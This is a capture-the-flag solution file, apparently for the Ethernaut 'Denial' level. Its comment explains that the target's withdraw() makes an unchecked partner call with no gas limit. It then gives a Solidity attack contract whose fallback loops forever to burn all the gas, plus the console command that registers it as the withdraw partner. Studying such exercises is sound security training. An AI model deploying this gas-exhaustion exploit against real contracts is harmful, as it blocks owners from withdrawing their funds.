/*
    Kind of easy but a tricky one..and it's fairly simple if you look up at the code

    In our target function, there exists a damn withdraw() function which consists of a line `partner.call({value:amountToSend})("")`
    This line doesn't have any fixed gas and doesn't even checks up whether this call got failed or not..Thus we create our own contract with the fallback function. and just inscribed the logic in between which kind of sucks up all the gas used in that function and didn't let the owner transfer the actual amount..
    This got us completed the level

    First deploy this attack contract and copy it's address
    just use this line in console -> await contract.setWithdrawPartner("[copied address]")
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{
    fallback() external payable{
        while (true){

        }
    }
}